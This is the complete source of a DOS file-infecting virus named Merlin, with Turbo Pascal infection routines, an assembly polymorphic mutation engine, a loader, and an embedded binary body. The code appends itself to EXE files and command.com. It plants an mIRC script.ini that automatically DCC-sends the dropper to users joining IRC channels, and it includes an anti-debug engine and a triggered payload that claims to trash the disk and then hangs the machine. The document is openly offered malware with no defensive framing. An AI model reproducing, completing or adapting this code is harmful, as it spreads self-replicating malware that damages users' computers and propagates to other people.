   HLLP.Merlin.6113 based on LME v.1.8.

   written in turbo pascal 7.0, write body to end of 'exe' filez.
   then it run infect command.com, and try create script.ini
   (mIRC worm)

   (c) LordDark [MATRiX]





   {$S- $R- $Q- $F-}
   uses dos;
   type
         mz_hdr = record
           Signature,
           ExtraBytes,
           Pages,
           RelocItems,
           HeaderSize,
           MinAlloc,
           MaxAlloc,
           InitSS,
           InitSP,
           CheckSum,
           InitIP,
           InitCS,
           RelocTable,
           Overlay:     Word;
   end;
   type
         virii = record
         buffer: Pointer;
         source: Pointer;
         vl:     word;
         OfsSS:  ^word;
         OfsSP:  ^word;
         OfsCS:  ^word;
         OfsIP:  ^word;
   end;

   procedure randomize; external;{$L engine.obj}
   procedure engine;external;
   procedure demos;     external; {$L payload.obj}
   procedure timer(tick:word);external;

   var
        f: file;
        dirinfo: searchrec;
        vir: virii;
        mz: mz_hdr;

   { LordDarkMutationEngine version 1.8 }

   function  LME(IP: word): word; assembler;
   asm
        push ds
        push es
        mov cx, vir.vl
        mov ax, ip
        les di, vir.buffer
        lds si, vir.source
        shr cx, 1
        adc cx, 0
        call engine
        xchg ax, cx
        pop es
        pop ds
   end;

   function make_dropper( fname: string): boolean;
   var
         dropper_len : word;
         ff          : file;
   begin
         make_dropper  := False;
         mz.Signature  := $5A4D;
         mz.RelocItems := 0;
         mz.HeaderSize := 2;
         mz.MinAlloc   := 0;
         mz.MaxAlloc   := $FFFF;
         mz.InitSS     := 0;
         mz.InitSP     := $FFFE;
         mz.CheckSum   := 0;
         mz.InitIP     := 0;
         mz.InitCS     := 0;

         vir.ofsip^ := 0;
         vir.ofscs^ := $FFF0;
         vir.ofsss^ := 0;
         vir.ofssp^ := $FFFE;

         dropper_len   := lme(0);
         mz.ExtraBytes := dropper_len mod $200;
         mz.Pages      := dropper_len div $200;
         if mz.ExtraBytes <> 0 Then Inc(mz.Pages);

         assign(ff, fname);
         {$I-} Rewrite(ff,1); {$I+}
         if ioresult <> 0 then exit;
         BlockWrite(ff, Addr(mz)^, sizeof(mz_hdr)+4);
         BlockWrite(ff, vir.buffer^, dropper_len);
         close(ff);
         make_dropper := True;
   end;

   procedure infect( fname: string );
   var
        attr: word;
   begin
        assign(f, fname);
        {$i-} reset(f, 1); {$i+}
        if IOResult <> 0 then Exit;
        if (FileSize(f) < 1000) Or (FileSize(f) > (200*1024) ) Then
           Begin Close(f); Exit; End;
        BlockRead(f, Addr(mz)^, sizeof(mz_hdr));
        if mz.InitCS <> 0 Then
        if mz.InitCS = mz.InitSS Then
           Begin Close(f); Exit; End;

        { infect command.com }

        If (mz.InitCS = 0) and (FileSize(f)<100000) and (FileSize(f) > 70000) Then
        Else
        Begin
        attr := FileSize(f) mod 512;
        if attr <> mz.ExtraBytes Then
           Begin Close(f); Exit; End;
        if attr <> 0 Then Dec(mz.Pages);
        if (FileSize(f) div 512) <> mz.Pages Then
           Begin Close(f); Exit; End;
        End;

        if (mz.signature = $5A4D) or (mz.Signature = $4D5A) then
        else
           Begin Close(f); Exit; End;
        vir.ofsip^ := mz.initip;
        vir.ofscs^ := mz.initcs;
        vir.ofsss^ := mz.initss;
        vir.ofssp^ := mz.initsp;
        mz.InitIP := (Filesize(f)-mz.HeaderSize*16) mod $10;
        attr := lme(mz.InitIP);
        mz.InitCS := (Filesize(f)-mz.HeaderSize*16) div $10;
        mz.InitSS := mz.InitCS;
        mz.InitSP := $FFFE;
        mz.Pages  := (FileSize(f)+attr) div 512;
        mz.ExtraBytes := (FileSize(f)+attr) mod 512;
        if mz.ExtraBytes <> 0 Then Inc(mz.Pages);
        Seek(f, FileSize(f));
        BlockWrite(f, vir.buffer^, attr);
        Seek(f, 0);
        BlockWrite(f, Addr(mz)^, sizeof(mz_hdr));
        Close(f);
   end;

   var
        r: registers;
        w: word;
   const
        test_write = #255#0;
        script1: string[115] =

          '[script]'#$D#$A+
          'n0=run merlin.exe'#$D#$A+
          'n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }'#$D#$A+
          'n2= /dcc send $nick merlin.exe'#$D#$A+
          'n3=}'#$D#$A;

        script2: string[29] =

          #$D#$A+
          '[fileserver]'#$D#$A+
          'Warning=Off'#$D#$A;

   procedure make_mirc( path: string) ;
   var
           ff: file;
   begin
           if make_dropper(+path+'mirc\'+'merlin.exe') then
                  begin
                     assign(ff, path+'mirc\'+'script.ini');
                     {$I-} reset(ff, 1); {$I+}
                     if ioresult <> 0 then
                        begin
                            {$I-} rewrite(ff, 1); {$I+}
                            if ioresult <> 0 then exit;
                        end
                     else
                       if filesize(ff) = length(script1) then begin close(ff); exit; end;
                     close(ff);
                     rewrite(ff,1);
                     BlockWrite(ff, script1[1], length(script1));
                     close(ff);
                     Seek(f, filesize(f));
                     BlockWrite(f, script2[1], length(script2));
                  end;
           close(f);
   end;

   begin
        randomize;
        r.ds := seg(vir);
        r.si := ofs(vir);
        intr($91,r);
        { make mIRC script }
        assign(f,'c:\mirc\mirc.ini');
        {$I-} reset(f, 1); {$I+}
        if ioresult = 0 then make_mirc('c:\')
        else
          begin
              assign(f,'c:\progra~1\mirc\mirc.ini');
              {$I-} reset(f, 1); {$I+}
              if ioresult = 0 then make_mirc('c:\progra~1\');
          end;
        if PortW[$40] = 666 then
           begin
              demos;
              Writeln('V-2D Merlin');
              Writeln;
              Writeln('Now you die!');
              Writeln;
              Write('Trash your disk ');
              for w:=1 to 20 do
                  begin
                      write('.');
                      timer(4);
                  end;
               Writeln;
               Writeln('Now you disk is fucked!!!!');
               asm
                  cli
               @0:
                  jmp @0
               end;
           end;
        assign(f, test_write);
        {$i-} rewrite(f, 1); {$i+}
        if IOResult <> 0 Then Halt(0);
        close(f);
        erase(f);
        FindFirst('*.exe', Archive, DirInfo);
        w:=0;
        while DosError = 0 do
        begin
           Inc(w);
           If w > 20 Then Break;
           Infect(DirInfo.Name);
           FindNext(DirInfo);
        end;
       infect(GetEnv('COMSPEC'));
   ed.

   --[engine.asm]---------------------------------------------------------------->8

   .286p
   locals __
   .model small
   .code

   public randomize, engine

       db 0,'[LME v.1.8]',0

   randomize proc
       mov ah, 2CH
       int 21h
       mov cs:[a], cx
       mov cs:[b], dx
       ret
       endp

   random:
       push bx cx dx
       push ax
       mov ax, 0
       org $-2
   A   dw  0
       mov bx, 0
       org $-2
   B   dw  0
       mov cx, ax
       mov dx, 8405h
       mul dx
       shl cx, 3
       add ch, cl
       add dx, cx
       add dx, bx
       shl bx, 2
       add dx, bx
       add dh, bl
       mov cl, 5
       shl bx, cl
       add dh, bl
       add ax, 1
       adc dx, 0
       mov 2 ptr cs:[A], ax
       mov 2 ptr cs:[B], dx
       pop bx
       mov cx, dx
       mul bx
       mov ax, cx
       mov cx, dx
       mul bx
       add ax, cx
       adc dx, 0
       xchg ax, dx
       pop dx cx bx
       ret

   include engine.inc

   one_byte:
       clc
       cld
       cli
       cmc
       sti
       nop
       stc
       std
       sahf
   ob_len = ($-one_byte)



   buffer:
   end

   --[vv.asm]-------------------------------------------------------------------->8

   len_body_in_mem equ 100h+RealBody+4000
   ; PSP+length PAS+buffer

   .model tiny
   .code
   org 100h
   start:
         call $+3
   delta:
         cld
         pop  bp
         push cs
         pop  ds
         push 2 ptr cs:[bp+OldSP-delta]
         push 2 ptr cs:[bp+OldSS-delta]
         push 2 ptr cs:[bp+OfsRET-delta]
         push 2 ptr cs:[bp+SegRET-delta]
         mov ax, 3590h
         int 21h
         mov 2 ptr cs:[old90-delta+bp],   bx
         mov 2 ptr cs:[old90+2-delta+bp], es
         mov ax, 3591h
         int 21h
         mov 2 ptr cs:[old91-delta+bp],   bx
         mov 2 ptr cs:[old91+2-delta+bp], es
         mov ax, 2590h
         lea dx, [bp+int_90-delta]
         int 21h
         mov ax, 2591h
         lea dx, [bp+int_91-delta]
         int 21h
         mov bx, cs
         cmp bx, 8000h
         ja  int_90
         lea si, [bp+vir-delta]
         mov cx, offset end_vir-vir
         sub dx, dx
   __crc:
         lodsb
         xor dl, al
         rol dx, 1
         loop __crc
         cmp 2 ptr [bp+crc-delta], cx
         jnz __crc?
         mov 2 ptr [bp+crc-delta], dx
   __crc?:
         cmp dx, 2 ptr [bp+crc-delta]
         jnz int_90
         lea ax, [bp+buffer-delta]
         mov cl, 4
         shr ax, cl
         inc ax
         add ax, bx
         mov 2 ptr cs:[bp+bufseg-delta], ax
         mov es, ax
         mov ah, 62h
         int 21h
         mov ds, bx
         sub di, di
         sub si, si
         mov cl, 100h/2
         cld
         rep movsw
         push cs
         pop  ds
         lea si, [bp+vir-delta]
         mov cx, body_len
         rep movsb
         mov ax, es
         mov ds, ax
         add ax, 10h
         mov 2 ptr ds:[relocofs+100h], ax
         mov bx, ax
         add bx, Start_SS
         cli
         mov ss, bx
         mov sp, 0FFFEh
         sti
         push ax
         sub ax, ax
         push ax
         retf
   int_90:
         call $+3
   _delta:
         pop bp
   _exit:
         ; ds=cs; bp=delta
         cli
         push cs
         pop  ss
         mov  sp, 0FFF6h
         sti
         pop 2 ptr cs:[bp+SegRET-_delta]
         pop 2 ptr cs:[bp+OfsRET-_delta]
         pop 2 ptr cs:[bp+OldSS-_delta]
         pop 2 ptr cs:[bp+OldSP-_delta]
         lds dx, 4 ptr cs:[bp+old90-_delta]
         mov ax, 2590h
         int 21h
         lds dx, 4 ptr cs:[bp+old91-_delta]
         mov ax, 2591h
         int 21h
         mov ah, 62h
         int 21h
         mov es, bx
         mov ds, bx
         mov dx, 80h
         mov ah, 1Ah
         int 21h
         add bx, 10h
         add 2 ptr cs:[bp+segRET-_delta], bx
         cli
         db  81h,0C3h
         dw  0
   oldSS equ 2 ptr $-2
         mov ss, bx
         mov sp, 0FFFEh
   oldSP equ 2 ptr $-2
         sub cx, cx
         mul cx     ; ax=dx=cx=0
         sub bx, bx
         sub si, si
         sub di, di
         sub bp, bp
         sti
         db  0EAH
   ofsRET    dw 0
   segRET    dw -10h

   _vir struc
          _buffer dd ?
          source dd ?
          _vl    dw ?
          OfsSS  dd ?
          OfsSP  dd ?
          OfsCS  dd ?
          OfsIP  dd ?
   ends

   int_91:
        call $+3
   $delta:
        pop  bp
        ; ax:si ??
        mov  ax, 2 ptr cs:[bp+bufseg-$delta]
        mov  2 ptr ds:[si._vir._vl], vl
        mov  2 ptr ds:[si._vir._buffer],   len_body_in_mem
        mov  2 ptr ds:[si._vir._buffer+2], ax
        mov  ax, cs
        mov  2 ptr ds:[si._vir.source+2], ax
        mov  2 ptr ds:[si._vir.OfsSS+2],  ax
        mov  2 ptr ds:[si._vir.OfsSP+2],  ax
        mov  2 ptr ds:[si._vir.OfsCS+2],  ax
        mov  2 ptr ds:[si._vir.OfsIP+2],  ax
        lea  ax, [bp+start-$delta]
        mov  2 ptr ds:[si._vir.source],   ax
        lea  ax, [bp+ofsret-$delta]
        mov  2 ptr ds:[si._vir.ofsip],    ax
        lea  ax, [bp+segret-$delta]
        mov  2 ptr ds:[si._vir.ofscs],    ax
        lea  ax, [bp+oldsp-$delta]
        mov  2 ptr ds:[si._vir.ofssp],    ax
        lea  ax, [bp+oldss-$delta]
        mov  2 ptr ds:[si._vir.ofsss],    ax
        iret
   include virstarz.inc
   crc  dw 0
   vir:
   include v.inc
   end_vir:
   vl = ($-start)
   bufseg  dw ?
   old90   dd ?
   old91   dd ?
   buffer:
   end start

   --[engine.inc]---------------------------------------------------------------->8

   engine:
       _ax = 0
       _cx = 1
       _dx = 2
       _bx = 3
       _sp = 4
       _bp = 5
       _si = 6
       _di = 7
       mov $di, di
       mov $cx, cx
       mov $si, si
       mov $ax, ax
       mov 1 ptr cs:[is_call], 0
       ;----------[ Start]---
       mov ax, 2
       call random
       mov 1 ptr cs:[is_debug], al
       call gen_garbage
       call gen_int
       db 0B0h
   is_debug db ?
       test al, al
       jz   __KOP
       mov  ax, -1
       call random
       mov  1 ptr cs:reg1, _ax
       mov  al, 0ADh
       sub  dx, dx
       xchg ax, dx
       call load
       mov  ax, 0
       org  $-2
       out  64h, al
       stosw
   __KOP:
       mov  1 ptr cs:reg1, -1
       call gen_int
       call gen_garbage
       call gen_int
       call not_trace
       call gen_int
       call gen_garbage
       call gen_int
       mov ax, 4
       call random
       ; 3 5 6 7
       cmp al, 0
       jnz __1
       mov al, 3
       jmp __2
   __1:
       add al, 5-1
   __2:
       mov cs:reg1, al
       ; mov reg, offset body
       call r_load
       push di
       cmp 1 ptr cs:[is_call], 0
       jz  __KL
       call make_end_call
   __KL:
       mov al, 2Eh
       stosb
       mov ax, 3
       call random
       shl al, 1
       mov bx, ax
       mov ax, 2 ptr cs:[bx+decrypt_inst]
       mov cs:_crypt, ax
       add bx, offset crypt_inst
       mov al, 1 ptr cs:[bx]
       stosb
       mov al, 0
   reg1 equ byte ptr $-1
       ; _bx _si _di _bp
       ;  3   0   1   2
       ;  3   6   7   5
       cmp al, _bx
       jz  __4
   __3:
       cmp al, _si
       jnz __5
       mov al, 0
       jmp __4
   __5:
       cmp al, _di
       jnz __6
       mov al, 1
       jmp __4
   __6:
       mov al, 2
   __4:
       or  al, cs:[bx+1]
       stosb
   ; ->
       mov  cs:ofs_body, di ; ofs
       stosw
   $$1:
       mov  ax, -1
       call random
       test ax, ax
       jz   $$1
       stosw
       mov  cs:key, ax ; key
       call gen_garbage
       ;-------[ Inc ]---
       mov al, 40h
       or  al, cs:reg1
       stosb
       push ax
       call gen_garbage
       pop  ax
       stosb
       call gen_garbage
       ;--------[ Cmp ]---
       cmp 1 ptr cs:[is_call], 0
       jz  __XL
       call make_end_call
   __XL:
       mov al, 10000001b
       stosb
       mov al, 11111000b
       or  al, cs:reg1
       stosb
   ; ->
       mov cs:max_ofs, di
       stosw
       ;--------[ Jne ]---
       mov al, 75h
       stosb
       pop ax
       push ax
       sub ax, di
       dec ax
       cmp ax, not 80h
       ja  _$1
       mov 1 ptr es:[di-1], 74h
       mov 1 ptr es:[di],   03h
       mov 1 ptr es:[di+1], 0E9h
       inc di
       inc di
       sub ax, 3
       stosw
       jmp  _$2
   _$1:
       stosb
   _$2:
       ;------------------
       call gen_garbage
       mov  ax, -1
       call random
       cmp  1 ptr cs:[is_debug], 0
       jz   __KOC
       mov  1 ptr cs:reg1, _ax
       mov  al, 0AEh
       sub  dx, dx
       xchg ax, dx
       call load
       mov  ax, 0
       org  $-2
       out  64h, al
       stosw
   __KOC:
       mov  1 ptr cs:reg1, -1
       cmp 1 ptr cs:[is_call], 0
       jz  __XLK
       call make_end_call
   __XLK:
       mov  1 ptr cs:[la_patch], 0EBh
       call gen_garbage
       mov  1 ptr cs:[la_patch], 075h
       ;----------------
       mov bx, di
       sub bx, offset buffer
   $di equ 2 ptr $-2
       pop si
   $$2:
       mov ax, -1
       call random
       cmp  ax, 8000h
       jb   $$3
       test ax, 1
       ; and ax, 1
       jnz  $$2
   $$3:
       xchg ax, dx
       mov ax, bx
       add ax, 100h
   $ax equ 2 ptr $-2
       add ax, dx
       mov 2 ptr es:[si-2], ax
       neg dx
       mov bx, 0
   ofs_body equ 2 ptr $-2
       mov 2 ptr es:[bx], dx
       mov cx, 1234h
   $cx equ 2 ptr $-2
       shl cx, 1
       add ax, cx
       mov bx, 0
   max_ofs equ 2 ptr $-2
       mov 2 ptr es:[bx], ax
       mov si, 0
   $si equ 2 ptr $-2
       mov cx, $cx
       mov bx, 0
   key equ 2 ptr $-2
   __x:
       lodsw
   _crypt dw 0
       stosw
       loop __x
       mov cx, di
       sub cx, cs:$di
       ret

   ; mov ax, xxx
   ; xor ax, xxx

   load:
       call boolean
       jnz  __r_load
       call r_load
       call gen_garbage
       ret
   __r_load:
       push ax
       mov ax, -1
       call random
       xchg bx, ax
       xor dx, bx
       pop ax
       push ax
       call r_load
       push bx
       call gen_garbage
       pop bx
       pop ax
       or  al, 35h
       stosb
       xchg ax, bx
       stosw
       call gen_garbage
       ret

   r_load proc
       call boolean
       jz  fuck_it
       shl al, 3
       or  al, 06h
       xchg al, ah
       mov al, 8Dh
       stosw
       jmp __fuck_it
   fuck_it:
       or al, 0B8h
       stosb
   __fuck_it:
       xchg ax, dx
       stosw
       ret
       endp

   not_trace proc
        mov ax, 2
        call random
        test ax, ax
        mov 1 ptr cs:[__sovet], al
        mov dx, 3521h
        jz  __fog
        mov dx, 3520h
   __fog:
        mov al, 0
        mov 1 ptr cs:[reg1], al
        call load
        mov  ax, 21CDh
        stosw
        mov  cs:reg1, _bx
        call gen_garbage
        mov  ax, -1
        call random
        mov  cs:regX, _ax
        mov  al, 0CFh
        sub  dx, dx
        xchg ax, dx
        call load
        mov  ax, 8626h
        stosw
        mov  al, 7
        stosb
        call gen_garbage
        db 0B0h
   __sovet db ?
        test al, al
        jz   __gen
        mov  ax, 20CDh
        stosw
        jmp  __pen
   __gen:
        mov  ax, 4CB4h
        stosw
        call gen_garbage
        mov  ax, 21CDh
        stosw
   __pen:
        call gen_garbage
        call boolean
        mov  ah, 86h
        jnz  __m
        mov  ah, 88h
   __m:
        mov  al, 26h
        stosw
        mov  al, 7
        stosb
   ; B0 CF             mov al, 0CFh
   ; 26: 86 07         xchg al, 1 ptr es:[bx]
   ; B4 4C             mov  ah, 4Ch
   ; CD 21             int  21h
   ; 26: 88 07         mov  1 ptr es:[bx], al
        mov  cs:reg1, -1
        mov  cs:regX, -1
        call gen_garbage
        ret
        endp

   crypt_inst:
        db 10000001b,10110100b
        db 10000001b,10000100b
        db 10000001b,10101100b
   decrypt_inst:
        xor ax, bx
        sub ax, bx
        add ax, bx

   gen_garbage:
        push dx
        mov ax, 10
        call random
        inc ax
        xchg ax, cx
   __1:
        push cx
        call garage
        pop  cx
        loop __1
        pop dx
        ret


   big_garbage:
   ; ADD/SUB/XOR/ROL/TEST/CMP...
   IZM_1 = 1
   IZM_0 = 0
   IZM_2 = 2
       db 10001011b, IZM_1 ; mov
       db 00000011b, IZM_1 ; add
       db 00010011b, IZM_1 ; adc
       db 00100011b, IZM_1 ; and
       db 00001011b, IZM_1 ; or
       db 00101011b, IZM_1 ; sub
       db 00011011b, IZM_1 ; sbb
       db 00110011b, IZM_1 ; xor
       db 00111011b, IZM_0 ; cmp
       db 10000101b, IZM_0 ; test
       db 11010001b, IZM_2 ; rxx R¢ 0..7 ò R¿? 6
   len_big_garbage = ($-big_garbage)/2

   free_reg:
        mov ax, 8
        call random
        cmp al, cs:reg1
        jz  free_reg
        cmp al, 4
        jz  free_reg
        cmp al, 0ffh
   regX equ byte ptr $-1
        jz  free_reg
        ret

   gen_mov:
        mov ax, 0fffeh
        call random
        xchg ax, dx
        call free_reg
        cmp al, 3
        ja  __1         ; al cl dl bl ?
        call boolean
        jz __1         ; use 16 regs?
        call boolean
        jz __2         ; use ah ch dh bh ?
        add al, 4
   __2:
        or  al, 0B0h
        stosb
        mov ax, 0ffh
        call random
        stosb
        ret
   __1:
        jmp  r_load

   gen_int proc
         call boolean
         jz   __1
         mov 1 ptr cs:reg1, _ax
         mov ax, len_int_func
         call random
         xchg ax, bx
         mov dh, 1 ptr cs:[bx+offset int_func]
         mov al,-1
         call random
         mov dl, al
         mov al, _ax
         call load
         mov ax, 21CDh
         stosw
         call gen_garbage
         mov 1 ptr cs:reg1, -1
   __1:
         ret
         endp

   int_func    db 51h, 62h, 30h,19h,2ah,2ch, 36h,4dh,0dh,23h,0bh
   len_int_func = ($-int_func)

   gen_byte:
          push bx
          mov ax, ob_len
          call random
          lea bx, one_byte
          xlat byte ptr cs:[bx]
          stosb
          pop bx
          ret

   garage proc
        mov ax, 4
        call random
        and al, al
   la_patch:
        jnz __X
   make_end_call:
        mov al, 0
   is_call equ byte ptr $-1
        test al, al
        jnz  __X1
        inc 1 ptr cs:[is_call]
        mov al, 0E8h
        stosb
        mov 2 ptr cs:[__DI], di
        stosw
        jmp __X
   __X1:
        call free_reg
        or   al, 0B8h
        stosb
   __XOR:
        db 0B8h
   __DI    dw 0
        mov dx, di
        sub dx, ax
        push di
        xchg ax, di
        xchg ax, dx
        sub  ax, 2
        stosw
        pop  di
        ; gar
        ; call xx
        ; gar
        ;
        ; xx:
        ; ret
        mov al, 0C3h
        stosb
        mov ax, 0ffh
        call random
        stosb
        dec 1 ptr cs:[is_call]
   __X:
        mov ax, len_big_garbage+2
        call random
        cmp al, len_big_garbage
        jz  gen_byte
        cmp al, len_big_garbage+1
        jnz __pop
        jmp gen_mov
   __pop:
        shl ax, 1
        add ax, offset big_garbage
        mov bx, ax
        mov al, cs:[bx]
        stosb
        mov al, cs:[bx+1]
        cmp al, 2
        jnz _standart
   __k:
        mov ax, 8
        call random
        cmp al, 6
        jz  __k
        shl al, 3
        or  al, 0C0h
        mov bl, al
        call free_reg
        cmp al, 3
        ja  __ok?
        call boolean
        jz  __ok?
        dec 1 ptr es:[di-1]
        ; h up ;-?
        call boolean
        jz  __ok?
        ; 0 1 2 3
        ; 4 5 6 7
        add al, 4
   __ok?:
        or al, bl
        stosb
        ret
        endp

   _standart:
        push ax
        mov  ax, 4
        call random
        sub  dl, dl
        cmp  al, 3
        jz   $$0
        dec  di
        mov  ah, es:[di]
        lea  bx, prefix
        xlat 1 ptr cs:[bx]
        stosb
        mov  al, ah
        stosb
        inc dl
   $$0:
        pop  ax
        cmp al, 0
        jnz not_change
        mov ax, 8
        call random
        jmp mumu
   not_change:
        call free_reg
   mumu:
        shl al, 3
        call boolean
        jz __p
        test dl, dl
        jz  __op
        ; Prefix, Command
        mov ah, es:[di-1]
        mov 1 ptr es:[di-2], ah
        dec di
   __op:
        mov ah, al
        shr ah, 3
        and ah, 111b
        cmp ah, 3
        ja  __ok$
        call boolean
        jz  __ok$
        dec 1 ptr es:[di-1]
        ; h up ;-?
        call boolean
        jz  __ok?
        ; 0 1 2 3
        ; 4 5 6 7
        add ah, 4
   __ok?:
        shl ah, 3
        and al, not 0111000b
        or  al, ah
   __ok$:
        or al, 0C0h
        stosb
        mov ax, 8
        call random
        or 1 ptr es:[di-1], al
        ret
   __p:
        ; al -reg
        mov ah, al
        shr ah, 3
        cmp ah, 3
        ja  __ok$$
        call boolean
        jz  __ok$$
        dec 1 ptr es:[di-1]
        ; h up ;-?
        call boolean
        jz  __ok?$
        ; 0 1 2 3
        ; 4 5 6 7
        add ah, 4
   __ok?$:
        shl ah, 3
        and al, not 0111000b
        or  al, ah
   __ok$$:
        or  al, 110b
        stosb
        mov  ax, 0FFFEh
        call random
        stosw
        ret
   prefix:
        segss
        segcs
        seges
   boolean:
        push ax
        mov ax, 2
        call random
        test ax, ax
        pop ax
        ret

   --[Virstarz.inc]-------------------------------------------------------------->8

   Start_IP = 0
   Start_CS = 0
   Body_Len = 5757
   RelocOfs = 5750
   Start_SP = 65534
   Start_SS = 561
   RealBody = 8144

   --[V.inc]--------------------------------------------------------------------->8


   db  0B9h,014h,00Bh,0BEh,026h,016h,089h,0F7h,01Eh,0A9h,0B5h,080h,08Ch,0C8h
   db  005h,005h,000h,08Eh,0D8h,005h,0D5h,000h,08Eh,0C0h,0FDh,0F3h,0A5h,0FCh
   db  02Eh,080h,06Ch,012h,010h,073h,0E7h,092h,0AFh,0ADh,00Eh,00Eh,00Eh,006h
   db  01Fh,007h,016h,0BDh,00Dh,000h,0BBh,0CFh,080h,055h,0CBh,055h,050h,058h
   db  021h,00Bh,003h,003h,00Ah,0DEh,00Fh,02Ah,092h,0D5h,0F7h,0A8h,057h,079h
   db  020h,000h,07Ch,015h,000h,020h,022h,000h,000h,019h,0FFh,055h,089h,0E5h
   db  01Eh,006h,08Bh,00Eh,098h,0FFh,001h,08Bh,046h,004h,0C4h,03Eh,090h,001h
   db  0FFh,0C5h,036h,094h,001h,0D1h,0E9h,083h,0D1h,0FFh,000h,0E8h,01Fh,009h
   db  091h,007h,01Fh,05Dh,0EEh,0C2h,002h,000h,022h,0FFh,081h,0ECh,084h,001h
   db  08Ch,0D3h,08Eh,0C3h,0FFh,08Ch,0DBh,0FCh,08Dh,0BEh,0FEh,0FEh,0C5h,0FFh
   db  076h,004h,0ACh,0AAh,091h,030h,0EDh,0F3h,0FFh,0A4h,08Eh,0DBh,0C6h,046h
   db  0FFh,000h,0C7h,0FFh,006h,0AAh,001h,04Dh,05Ah,031h,0C0h,0A3h,0DBh,0B0h
   db  001h,00Ah,0B2h,0E6h,001h,002h,000h,09Bh,0B4h,0B6h,001h,0CDh,0FFh,0FFh
   db  0B8h,037h,0BAh,001h,0FEh,03Eh,0BCh,001h,0E9h,004h,0BEh,0F6h,0C0h,001h
   db  06Eh,0DDh,0A6h,008h,026h,0CBh,089h,005h,0A2h,0FDh,001h,026h,0C7h,005h
   db  0F0h,0FFh,0B2h,011h,09Ah,01Ch,09Eh,0EFh,032h,0FFh,050h,0E8h,05Bh,0FFh
   db  089h,086h,0FCh,0FEh,0BBh,08Bh,003h,031h,0D2h,0FFh,0B9h,000h,002h,0F7h
   db  0F1h,092h,0A3h,0ACh,0BFh,001h,00Eh,0B1h,009h,0FEh,0D3h,0E8h,0A3h,0AEh
   db  001h,083h,03Eh,05Fh,000h,074h,004h,0FFh,0B5h,006h,00Ah,0BEh,09Ch,07Ch
   db  0FEh,016h,057h,0F6h,0A2h,005h,0FBh,09Ah,02Eh,007h,00Bh,010h,005h,0BEh
   db  080h,000h,050h,09Ah,072h,0EEh,00Eh,09Ah,08Ah,002h,0DFh,004h,009h,0C0h
   db  074h,002h,0D9h,0EBh,04Fh,019h,0DBh,0BFh,0B8h,01Eh,06Ch,01Eh,020h,0AEh
   db  068h,06Eh,022h,05Bh,008h,06Dh,091h,002h,086h,036h,01Fh,00Fh,006h,057h
   db  0DCh,0FFh,0B6h,078h,0C0h,01Dh,01Dh,09Ah,0EAh,0EFh,050h,00Fh,00Dh,002h
   db  001h,0B7h,08Ah,003h,089h,0ECh,00Bh,02Dh,004h,027h,002h,025h,0E4h,000h
   db  0FFh,00Fh,0BFh,0E4h,0B5h,000h,06Fh,0ECh,014h,09Fh,017h,00Fh,0B3h,09Eh
   db  090h,069h,01Fh,003h,0E9h,0EBh,002h,07Bh,019h,063h,072h,09Eh,00Dh,00Fh
   db  083h,0FAh,000h,0FFh,07Ch,022h,07Fh,005h,03Dh,0E8h,003h,072h,0B2h,01Bh
   db  01Ah,09Fh,003h,07Fh,007h,07Ch,0FCh,017h,03Dh,000h,020h,076h,012h,09Bh
   db  099h,027h,0E9h,0A3h,066h,047h,0CEh,0E6h,01Ch,041h,090h,054h,0C2h,039h
   db  0CDh,0C0h,01Bh,0B7h,0A1h,005h,03Bh,006h,06Dh,084h,075h,094h,03Dh,0ECh
   db  065h,002h,021h,076h,075h,039h,071h,053h,001h,0FFh,07Ch,007h,07Fh,023h
   db  03Dh,0A0h,086h,073h,0B2h,01Eh,01Ah,0B7h,08Ch,07Dh,008h,03Dh,070h,011h
   db  076h,0B9h,0C5h,084h,000h,021h,00Dh,0BEh,031h,0F6h,0DBh,09Ah,09Dh,009h
   db  009h,0F8h,089h,0C8h,089h,0DAh,059h,0D6h,0FEh,09Ah,003h,0DEh,07Ch,0ACh
   db  001h,074h,04Ah,06Dh,0E8h,04Bh,00Ch,0C7h,01Eh,0D8h,00Eh,056h,047h,014h
   db  0FDh,08Bh,0C8h,08Bh,0DAh,0A1h,0A3h,01Fh,019h,07Fh,03Bh,0D3h,075h,004h
   db  03Bh,0C1h,065h,046h,07Eh,0A1h,001h,081h,03Eh,03Fh,09Dh,074h,008h,07Fh
   db  007h,05Ah,04Dh,075h,00Ah,0FBh,0CAh,023h,07Ch,07Dh,001h,0A1h,0BEh,062h
   db  08Eh,038h,07Ah,030h,00Ch,0F7h,08Fh,009h,0CDh,0B8h,09Ah,023h,0BAh,034h
   db  09Eh,088h,0DFh,0DDh,0B1h,004h,0D3h,0E0h,06Eh,06Eh,052h,050h,0C8h,092h
   db  07Fh,059h,05Bh,02Bh,0C1h,01Bh,0D3h,0ECh,0B9h,010h,000h,0E0h,004h,076h
   db  0E9h,0FFh,036h,0DEh,003h,0E8h,099h,0FCh,0F6h,0EAh,03Bh,005h,069h,01Ch
   db  09Ch,086h,092h,037h,059h,02Dh,00Bh,0F2h,0C3h,036h,0B7h,048h,003h,0C1h
   db  0C2h,013h,0D3h,00Ah,05Ah,066h,00Ah,029h,004h,02Ch,09Bh,069h,0ACh,038h
   db  003h,062h,038h,0C8h,03Dh,063h,052h,029h,064h,0BCh,037h,01Ah,0A4h,00Fh
   db  099h,0FEh,021h,062h,01Ch,0D7h,012h,0D8h,0B2h,031h,011h,096h,077h,0CAh
   db  030h,0C2h,07Fh,05Ah,04Fh,038h,005h,06Dh,0FFh,069h,072h,063h,05Ch,00Ah
   db  06Dh,065h,072h,0FFh,06Ch,069h,06Eh,02Eh,065h,078h,065h,00Ah,0FEh,073h
   db  063h,072h,069h,070h,074h,02Eh,0DAh,00Dh,069h,047h,054h,080h,003h,021h
   db  00Bh,00Fh,07Ah,080h,0FDh,016h,043h,055h,0CDh,089h,00Ah,08Ah,0DBh,004h
   db  00Eh,009h,008h,09Ah,00Bh,090h,043h,0FCh,0E8h,037h,0FBh,008h,0C0h,075h
   db  06Dh,093h,02Ch,074h,024h,080h,0EDh,034h,090h,0FCh,08Eh,09Bh,043h,059h
   db  043h,0BDh,02Fh,025h,0A4h,076h,01Dh,017h,003h,072h,048h,0BCh,04Fh,0D8h
   db  000h,0EBh,0B3h,036h,01Ch,008h,08Ah,05Ch,0A0h,00Bh,018h,030h,08Ch,0E4h
   db  0A9h,065h,017h,0D8h,075h,013h,022h,023h,086h,02Fh,0A0h,000h,064h,012h
   db  06Ch,062h,08Dh,097h,013h,0BFh,086h,003h,042h,062h,050h,0B2h,0BAh,096h
   db  042h,016h,010h,0D9h,003h,06Ch,04Dh,077h,0F2h,076h,061h,0A9h,02Ah,07Ch
